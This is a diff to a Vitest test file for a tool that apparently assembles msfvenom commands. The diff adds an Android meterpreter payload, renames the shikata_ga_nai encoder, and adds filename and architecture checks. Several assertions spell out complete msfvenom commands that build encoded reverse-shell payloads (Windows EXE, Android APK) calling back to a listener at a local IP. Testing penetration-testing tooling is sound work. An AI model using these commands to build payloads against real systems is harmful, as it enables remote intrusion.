@@ -1,5 +1,5 @@
 import { describe, expect, it } from "vitest";
-import { MSFVENOM_ENCODERS_BY_ID, NONE_ENCODER } from "./encoders";
+import { MSFVENOM_ENCODERS_BY_ID, NONE_ENCODER, encodersForArch } from "./encoders";
 import { MSFVENOM_FORMATS_BY_ID } from "./formats";
 import { MSFVENOM_PAYLOADS_BY_ID } from "./payloads";
 import { MSFVENOM_TEMPLATES } from "./templates";
@@ -9,6 +9,7 @@ import {
   buildListenerParamsOnly,
   hasNoEncoderRisk,
   MsfvenomSelection,
+  requiresOutputFilename,
   resolvePayloadId,
   suggestFilename,
 } from "./generate";
@@ -16,11 +17,12 @@ import {
 const windowsMeterpreter = MSFVENOM_PAYLOADS_BY_ID["windows/meterpreter/reverse_tcp"];
 const linuxShell = MSFVENOM_PAYLOADS_BY_ID["linux/{arch}/shell_reverse_tcp"];
 const pythonPayload = MSFVENOM_PAYLOADS_BY_ID["python/meterpreter/reverse_tcp"];
+const androidMeterpreter = MSFVENOM_PAYLOADS_BY_ID["android/meterpreter/reverse_tcp"];
 const exeFormat = MSFVENOM_FORMATS_BY_ID.exe;
 const elfFormat = MSFVENOM_FORMATS_BY_ID.elf;
 const rawFormat = MSFVENOM_FORMATS_BY_ID.raw;
 const pyFormat = MSFVENOM_FORMATS_BY_ID.py;
-const shikata = MSFVENOM_ENCODERS_BY_ID.shikata_ga_nai;
+const shikata = MSFVENOM_ENCODERS_BY_ID["x86/shikata_ga_nai"];
 
 function baseSelection(overrides: Partial<MsfvenomSelection>): MsfvenomSelection {
   return {
@@ -67,7 +69,7 @@ describe("buildCommand", () => {
 
   it("includes -e and -i with the exact iteration count when an encoder is set", () => {
     const cmd = buildCommand(baseSelection({ encoder: shikata, iterations: 3 }));
-    expect(cmd).toContain("-e shikata_ga_nai -i 3");
+    expect(cmd).toContain("-e x86/shikata_ga_nai -i 3");
   });
 
   it("omits -a for path-segment payloads (arch is baked into -p)", () => {
@@ -116,8 +118,37 @@ describe("buildCommand", () => {
       baseSelection({ encoder: shikata, iterations: 2, arch: "x86", lhost: "192.168.1.100", lport: 4444, filename: "payload.exe" }),
     );
     expect(cmd).toBe(
-      "msfvenom -p windows/meterpreter/reverse_tcp -f exe -e shikata_ga_nai -i 2 -a x86 LHOST=192.168.1.100 LPORT=4444 EXITFUNC=thread -o payload.exe",
+      "msfvenom -p windows/meterpreter/reverse_tcp -f exe -e x86/shikata_ga_nai -i 2 -a x86 LHOST=192.168.1.100 LPORT=4444 EXITFUNC=thread -o payload.exe",
     );
+  });
+
+  it("includes -o for Android even though its format (raw) doesn't normally produce a file, and omits -a (no real Android arch value)", () => {
+    const cmd = buildCommand(
+      baseSelection({
+        payload: androidMeterpreter,
+        arch: null,
+        format: rawFormat,
+        exitfunc: null,
+        filename: "meterpreter_reverse.apk",
+      }),
+    );
+    expect(cmd).toContain("-f raw");
+    expect(cmd).not.toContain(" -a ");
+    expect(cmd.endsWith("-o meterpreter_reverse.apk")).toBe(true);
+  });
+});
+
+describe("requiresOutputFilename", () => {
+  it("is true for formats that produce a file", () => {
+    expect(requiresOutputFilename(windowsMeterpreter, exeFormat)).toBe(true);
+  });
+
+  it("is false for raw/console-dump formats on ordinary payloads", () => {
+    expect(requiresOutputFilename(windowsMeterpreter, rawFormat)).toBe(false);
+  });
+
+  it("is true for Android even with the raw format, since forceOutputFilename is set", () => {
+    expect(requiresOutputFilename(androidMeterpreter, rawFormat)).toBe(true);
   });
 });
 
@@ -167,10 +198,19 @@ describe("template -> command generation", () => {
     if (template.encoderId !== "none") {
       expect(cmd).toContain(`-e ${template.encoderId} -i ${template.iterations}`);
     }
-    if (format.producesFile) {
+    if (requiresOutputFilename(payload, format)) {
       expect(cmd.endsWith(`-o ${template.filename}`)).toBe(true);
     } else {
       expect(cmd).not.toContain("-o");
     }
+  });
+
+  it.each(MSFVENOM_TEMPLATES)("template $id's encoder is valid for its own architecture", (template) => {
+    const payload = MSFVENOM_PAYLOADS_BY_ID[template.payloadId];
+    const validIds = encodersForArch(template.archId).map((e) => e.id);
+    expect(validIds, `${template.id}: ${template.encoderId} not valid for arch ${template.archId}`).toContain(template.encoderId);
+    expect(payload.compatibleFormats, `${template.id}: ${template.formatId} not compatible with ${payload.id}`).toContain(
+      template.formatId,
+    );
   });
 });
